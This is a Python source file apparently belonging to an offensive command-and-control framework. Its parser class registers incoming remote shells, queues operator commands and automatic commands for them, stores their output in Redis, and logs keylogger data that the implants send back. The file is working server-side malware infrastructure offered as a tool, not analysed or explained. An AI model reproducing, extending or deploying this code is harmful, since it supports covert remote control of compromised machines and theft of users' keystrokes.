#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author: Mr.Un1k0d3r RingZer0 Team
    @package: core/parser.py
"""

from core.log import Log
from core.ui import UI
from core.utils import Utils


class HTTPDParser:

    def __init__(self, config):
        self.cmds = {}
        self.cmds['register'] = self.register
        self.cmds['ping'] = self.ping
        self.cmds['userinput'] = self.keylogger
        self.config = config
        self.output = None
        self.db = self.config.get('redis')

    def parse_cmd(self,guid,data,cmd_guid=None,):
        cmd = data.split(' ', 1)[0].lower()
        if self.cmds.has_key(cmd):
            callback = self.cmds[cmd]
            callback(guid, data)
        else:
            if cmd_guid == None:
                self.hello(guid, data)
            else:
                # I assume we got command output here and save it
                self.db.push_output(guid, data, cmd_guid)
                Log.log_shell(guid, 'Received', data)
                self.db.append_shell_data(guid, "[%s] Received: \n%s\n" % (Utils.timestamp(),data))
        return self.output

    def register(self, guid, data):
        (cmd, guid, prompt) = data.split(' ', 2)
        self.db.set_prompt(guid, prompt)
        index = self.db.get_id(guid)
        print ''
        UI.success('Registering new shell %s' % prompt)
        UI.success('New shell ID %s GUID is %s' % (index, guid))
        self.db.set_key("%s:keylogger" % guid, "")
        Log.log_event('New Shell', data)
        self.get_autocommands(guid)
        if self.config.get('auto-interact') == 'on':
            pass

    def hello(self, guid, data):
        self.output = self.db.get_cmd(guid)

    def ping(self, guid, data):
        # not used for the moment every callback act as a ping
        self.output = 'pong'

    def keylogger(self, guid, data):
        (cmd, data) = data.split(' ', 1)
        Log.append_keylogger_data(guid, data)
        Log.log_event('Keylogger', 'Data received (%s)' % guid)
        self.db.append_keylogger_data(guid, data)

    def get_autocommands(self, guid):
        profile = self.config.get('profile')
        commands = profile.get('autocommands')
        if isinstance(commands, list):
            UI.success('Running auto commands on shell %s' % guid)
            Log.log_event('Running auto commands on shell', guid)
            for command in commands:
                print '\t[+] %s' % command
                Log.log_shell(guid, 'Sending', command)
                self.db.append_shell_data(guid, "[%s] AutoCommand Sending: \n%s\n" % (Utils.timestamp(),command))
                self.db.push_cmd(guid, command, Utils.guid(), self.config.get('username'))
